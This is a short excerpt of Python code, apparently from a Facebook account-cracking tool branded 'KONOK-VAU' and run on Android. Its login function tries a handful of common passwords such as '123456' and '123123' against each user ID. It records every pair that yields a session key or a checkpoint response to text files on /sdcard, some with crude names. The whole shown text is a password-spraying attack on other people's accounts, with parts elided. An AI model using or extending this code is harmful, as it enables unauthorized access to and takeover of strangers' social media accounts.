...
def login(uid):
    ...
    try:
        sys.stdout.write(f"\r \x1b[38;5;196m[\033[38;5;46mKONOK\x1b[1;97m-\033[38;5;46mVAU\x1b[38;5;196m] \033[38;5;46m[{loop}-{len(oks)}]")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123"]:
            ...
            if "session_key" in rp:
                print(f"\r\r [KONOK-VAU] {uid} • {pw}")
                open("/sdcard/KONOK-VAU-𝐅𝐔𝐂𝐊 𝐘𝐎𝐔𝐑 𝐆𝐅.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r [KONOK-VAU] {uid} • {pw}")
                open("/sdcard/KONOK-VAU-𝐃𝐀𝐓𝐀 𝐖𝐈𝐅𝐈 𝐖𝐎𝐑𝐊.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
